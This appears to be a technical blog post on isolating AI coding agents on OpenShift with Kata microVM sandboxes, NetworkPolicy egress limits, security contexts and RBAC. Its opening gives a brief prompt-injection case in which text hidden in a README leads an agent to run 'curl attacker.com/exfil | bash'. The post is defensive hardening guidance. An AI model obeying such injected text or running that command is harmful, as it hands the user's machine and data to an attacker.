# Sandboxing AI Coding Agents on OpenShift

*Part 1 of the AgentOps series — running AI agents safely on OpenShift with microVM isolation, NetworkPolicy, and Pod Security Standards.*

---

## AI agents run untrusted code. That's the job.

AI coding agents don't just suggest code — they execute it. An agent like Claude Code will `npm install` a package, run a shell script, compile a binary, and modify files across a repository, all autonomously. That's what makes them useful. It's also what makes them dangerous.

A single prompt injection — hidden in a README, a pull request description, or an API response — can trick the agent into running `curl attacker.com/exfil | bash`. The agent isn't malicious. It's doing exactly what it was told. The problem is *who* told it.

When you run 5, 10, or 20 of these agents on a shared OpenShift cluster, the question becomes: how do you keep each agent isolated from the host, from each other, and from the rest of your infrastructure?

## Why standard containers aren't enough

OpenShift already provides stronger defaults than vanilla Kubernetes. Security Context Constraints (SCCs), SELinux labeling, and non-root enforcement are baked in. But the fundamental isolation mechanism — Linux containers via CRI-O and runc — relies on the kernel:

- **Namespaces** make the process *think* it's alone (separate PID tree, network, mounts)
- **Cgroups** enforce resource budgets (CPU, memory)
- **Seccomp + dropped capabilities** restrict syscalls

The critical detail: **all containers on a node share the same kernel**. The namespace boundaries are enforced *by* the kernel. If an attacker finds a kernel vulnerability — a race condition in a syscall, a bug in `io_uring` — the walls disappear. The container escapes to the host.

For a Node.js API server you wrote and reviewed? Acceptable risk. For code an LLM improvised five seconds ago? Different calculus.

## The isolation spectrum

| Approach | Isolation boundary | Startup | Overhead | Kernel exploits |
|---|---|---|---|---|
| **CRI-O + runc** (OpenShift default) | Linux namespaces + SCCs | ~100ms | Minimal | Shared kernel = exposed |
| **gVisor** | Userspace kernel intercepts syscalls | ~100ms | ~10-20MB | Reduced surface (~200 vs 400+ syscalls) |
| **OpenShift Sandboxed Containers (Kata)** | Hardware virtualization (KVM) | ~1-2s | ~50-100MB | Separate kernel per pod |
| **Full VM** | Complete hypervisor | 30-60s | 512MB+ | Full isolation |

gVisor reduces the attack surface by reimplementing syscalls in userspace, but it's not supported by Red Hat on OpenShift. Full VMs are safe but too heavy for pod-level isolation.

**OpenShift Sandboxed Containers** hits the sweet spot: each pod gets its own kernel inside a lightweight VM (QEMU/KVM), while still looking like a normal pod to the platform. It ships as a supported operator with a GA lifecycle.

## How OpenShift Sandboxed Containers works

The OpenShift Sandboxed Containers Operator installs Kata Containers as an alternative runtime alongside CRI-O. When a pod specifies `runtimeClassName: kata`, CRI-O delegates to `containerd-shim-kata-v2`, which starts a QEMU microVM with a dedicated guest kernel. The pod's containers run *inside* that VM.

```
┌─ OpenShift Node (bare metal) ──────────────────────────────┐
│                                                             │
│  Host Kernel + /dev/kvm                                     │
│                                                             │
│  ┌─ Kata MicroVM (Agent 1) ───────┐  ┌─ Kata MicroVM ───┐  │
│  │  Guest Kernel                  │  │  Guest Kernel     │  │
│  │  ┌───────────────────────────┐ │  │  ┌─────────────┐  │  │
│  │  │ Claude Code + Node.js    │ │  │  │ Agent 2     │  │  │
│  │  │ npm install, git, shell  │ │  │  │ ...         │  │  │
│  │  └───────────────────────────┘ │  │  └─────────────┘  │  │
│  └────────────────────────────────┘  └───────────────────┘  │
│                                                             │
│  ┌─ runc (regular pods) ──────────────────────────────────┐ │
│  │  Coder, MLflow, vLLM, Operators (shared host kernel)   │ │
│  └────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

From OpenShift's perspective — scheduling, networking, storage, monitoring — it's still a pod. Routes, Services, ConfigMaps, `oc logs`, `oc exec` — everything works the same. The only difference is one field in the spec.

## Setting it up on OpenShift

### 1. Install the operator

OpenShift Sandboxed Containers is available from OperatorHub:

```yaml
apiVersion: operators.coreos.com/v1alpha1
kind: Subscription
metadata:
  name: sandboxed-containers-operator
  namespace: openshift-sandboxed-containers-operator
spec:
  channel: stable-1.3
  name: sandboxed-containers-operator
  source: redhat-operators
  sourceNamespace: openshift-marketplace
```

### 2. Create KataConfig

Once the operator is ready, create a `KataConfig` to install the Kata runtime on your worker nodes:

```yaml
apiVersion: kataconfiguration.openshift.io/v1
kind: KataConfig
metadata:
  name: cluster-kataconfig
```

This triggers a MachineConfig update. Nodes in the targeted pool reboot and come back with `kata` as an available `RuntimeClass`.

### 3. The bare metal constraint

Here's where it gets real. Kata needs KVM. KVM needs `/dev/kvm`. On AWS, regular EC2 instances don't expose nested virtualization — the VMX/SVM CPU flags read zero and `/dev/kvm` is absent. **Only bare metal instances provide it.**

| Instance | Type | `/dev/kvm` | Kata | Cost/h |
|---|---|---|---|---|
| m6a.4xlarge | VM | No | No | $0.69 |
| g6e.4xlarge | VM | No | No | $1.86 |
| m5.metal | Bare metal | Yes | Yes | $4.61 |
| c5.metal | Bare metal | Yes | Yes | $4.08 |

We use a dedicated MachineSet for bare metal nodes and a `nodeSelector` to pin agent pods to them:

```yaml
nodeSelector:
  node.kubernetes.io/instance-type: m5.metal
```

Regular workloads (operators, vLLM, observability) stay on standard VMs. Only the agent sandboxes need bare metal.

### 4. Deploy an agent pod

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: claude-code-standalone
  namespace: agent-sandboxes
spec:
  replicas: 1
  template:
    spec:
      runtimeClassName: kata
      nodeSelector:
        node.kubernetes.io/instance-type: m5.metal
      containers:
        - name: claude-code
          image: image-registry.openshift-image-registry.svc:5000/agent-sandboxes/claude-code-agent:latest
          resources:
            requests:
              cpu: "100m"
              memory: 256Mi
            limits:
              cpu: "1"
              memory: 2Gi
          securityContext:
            allowPrivilegeEscalation: false
            runAsNonRoot: true
            seccompProfile:
              type: RuntimeDefault
            capabilities:
              drop: ["ALL"]
```

Three things to notice:

**`runtimeClassName: kata`** swaps the runtime from runc (shared kernel) to Kata (microVM with dedicated kernel). This is the only application-level change required.

**`nodeSelector: m5.metal`** ensures scheduling on bare metal nodes where `/dev/kvm` is available.

**`securityContext`** is defense in depth. Even inside the VM, the container runs non-root, drops all capabilities, and uses the default seccomp profile. If the VM boundary were to fail, these restrictions still apply.

The container image is built from a UBI 9 base (`registry.access.redhat.com/ubi9/nodejs-22`) with Claude Code CLI, git, and Python installed. It runs as UID 1001 and uses `sleep infinity` as PID 1 — developers interact via `oc exec`.

## Why `privileged: true` isn't scary inside a Kata VM

One of the most important properties of this model: `privileged: true` inside a Kata VM does **not** grant host access.

In a standard runc container, `privileged: true` disables most security boundaries — the process gets all Linux capabilities, access to host devices, and can mount host filesystems. It's essentially root on the node.

In a Kata VM, `privileged: true` gives the process root *inside the guest kernel*. The host kernel never sees it. Kata enforces this with `privileged_without_host_devices=true`, which blocks access to host devices even when the guest container is privileged.

This matters for AI agents because they sometimes need to do things that look privileged — mounting FUSE filesystems, running Docker builds, using `strace` for debugging. Inside a Kata VM, you can grant these capabilities without exposing the host.

## Network isolation with OVN-Kubernetes

A microVM gives you kernel-level isolation. But an agent that can freely talk to the internet, exfiltrate data to any IP, or probe internal services is still dangerous. The sandbox needs network boundaries.

OpenShift uses OVN-Kubernetes as its default network plugin, which supports Kubernetes NetworkPolicy. We use it to build an explicit-allow model:

```
Agent pod can talk to:
  ✓ DNS (ports 53 + 5353)
  ✓ Inference service — vLLM (port 8080)
  ✓ Observability — MLflow (port 5000)
  ✓ MCP Gateway — tool governance (port 8443)
  ✓ External HTTPS (443) — GitHub, npm registries

Agent pod CANNOT talk to:
  ✗ Other agent pods
  ✗ Other namespaces (except the allowed services above)
  ✗ Private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
  ✗ Any port other than those explicitly listed
```

Ingress is even tighter. The only things that can reach into the `agent-sandboxes` namespace are the Coder control plane (to provision workspaces) and the Kagenti operator (to inject identity sidecars). No cross-agent communication. No external ingress.

### A gotcha with OVN-Kubernetes and DNS

One lesson learned: OpenShift's CoreDNS listens on port **5353**, not just 53. The ClusterIP Service maps 53 to 5353, but OVN-Kubernetes evaluates NetworkPolicy rules **post-DNAT**. If your egress policy only allows port 53, DNS silently breaks. You need both:

```yaml
ports:
  - port: 53
    protocol: UDP
  - port: 5353
    protocol: UDP
```

This is the kind of thing that works fine without NetworkPolicy and mysteriously breaks the moment you apply one. We documented it as an ADR to save future us the debugging session.

## The defense-in-depth stack

No single mechanism is enough. OpenShift gives us multiple layers to stack:

```
┌─────────────────────────────────────────────────┐
│ Layer 5: NetworkPolicy (OVN-Kubernetes)         │
│   Egress restricted to known services           │
│   No cross-agent communication                  │
├─────────────────────────────────────────────────┤
│ Layer 4: Namespace + RBAC + ResourceQuota       │
│   Pod Security Standards: restricted            │
│   ServiceAccount: automountToken disabled       │
│   ResourceQuota: 25 pods, 40 CPUs, 80Gi max     │
├─────────────────────────────────────────────────┤
│ Layer 3: Security context + SCCs                │
│   Non-root (UID 1001), no privilege escalation  │
│   All capabilities dropped, seccomp enforced    │
│   SELinux labels (MCS isolation)                │
├─────────────────────────────────────────────────┤
│ Layer 2: OpenShift Sandboxed Containers (Kata)  │
│   Dedicated guest kernel per pod (QEMU/KVM)     │
│   privileged_without_host_devices=true          │
│   Hardware-enforced memory isolation            │
├─────────────────────────────────────────────────┤
│ Layer 1: Bare metal node                        │
│   /dev/kvm for hardware virtualization          │
│   Host kernel untouched by guest workloads      │
│   Dedicated MachineSet with node selector       │
└─────────────────────────────────────────────────┘
```

If the agent's code exploits a vulnerability in Node.js, it's trapped by the container security context and SELinux. If it escapes that, it's in a guest kernel that can't reach the host. If it escapes the VM (requiring a QEMU/KVM exploit), it hits NetworkPolicy rules that block lateral movement. And those sit on top of namespace RBAC and ResourceQuota that limit the blast radius.

## Trade-offs

**Cost.** Bare metal instances are expensive. On AWS, `m5.metal` costs $4.61/hour vs $0.69/hour for a regular VM. But `m5.metal` gives you 96 vCPUs and 384GB RAM — enough for dozens of agent microVMs. The per-agent cost amortizes quickly.

**Startup latency.** Kata VMs take 1-2 seconds to start vs 100ms for runc. For workspace-level isolation (one VM per developer session that lasts hours), this is imperceptible. For request-level isolation, it would be a dealbreaker.

**Memory overhead.** Each Kata VM adds ~50-100MB for the guest kernel. 10 agents = ~1GB overhead on a 384GB node. Noise.

**Operational complexity.** The Sandboxed Containers Operator introduces a KataConfig CRD, a MachineConfigPool, and MachineConfig updates that reboot nodes. We hit a SELinux bug where the operator's `osc-monitor` DaemonSet crashes on OCP 4.20 (RHEL 8 operator images vs RHEL 9 host kernel). The Kata runtime itself works fine — the bug only affects monitoring. But it took time to diagnose and triage.

## What's next

Isolation is the foundation, but it's one layer of a broader platform. A sandbox prevents an agent from *escaping*. It doesn't prevent it from doing damage *within* its sandbox — deleting the repo it's working on, committing bad code, or leaking secrets through legitimate channels like git push.

The next articles in this series cover:

- **Identity** — giving each agent a cryptographic identity (SPIFFE/Kagenti) so every action is attributable
- **Tool governance** — controlling *which* tools each agent can call through an MCP Gateway
- **Guardrails** — intercepting prompts and responses to catch PII leaks and prompt injection
- **Observability** — tracing every action an agent takes with MLflow for audit and debugging
- **Inference** — hosting your own LLM (vLLM + Qwen) so agent traffic never leaves the cluster

Without the sandbox, identity is spoofable, governance is bypassable, and observability is untrustworthy. Everything else builds on the assumption that each agent runs in a controlled environment with clear, hardware-enforced boundaries.

---

*This article is part of the AgentOps series documenting how we run AI coding agents on OpenShift with isolation, identity, governance, and observability.*
